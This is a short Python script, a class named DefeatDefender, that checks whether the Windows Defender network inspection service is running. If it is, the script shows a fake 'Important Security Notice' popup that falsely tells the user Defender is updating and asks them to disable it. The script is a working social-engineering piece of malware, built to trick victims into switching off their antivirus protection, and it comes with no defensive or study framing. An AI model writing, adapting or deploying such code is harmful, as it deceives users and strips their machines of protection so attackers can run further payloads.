import psutil
import tkinter as tk
from tkinter import messagebox

class DefeatDefender:
    def __init__(self):
        self.isrunning = False

    def check_service(self):
        try:
            service = psutil.win_service_get('WdNisSvc')
            service = service.as_dict()
            for i in service:
                if service[i] == 'running':
                    self.isrunning = True
                    return
        except Exception as ex:
            print(f"Error occurred while checking Windows Defender status: {ex}")
            self.isrunning = False  # Defender is not running

    def show_defender_popup(self):
        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo("Attention: Important Security Notice", 
                            "Windows Defender is currently updating its threat database. While these updates are crucial for your system's security\n\nFor your safety and to ensure optimal performance of our system, we kindly request you to temporarily disable Windows Defender until the updates are complete. Once the updates are finished, we will notify you to re-enable it.")
        root.destroy()

if __name__ == '__main__':
    defender_checker = DefeatDefender()  # Create an instance of DefeatDefender
    defender_checker.check_service()  # Check Windows Defender status
    if defender_checker.isrunning:
        defender_checker.show_defender_popup()
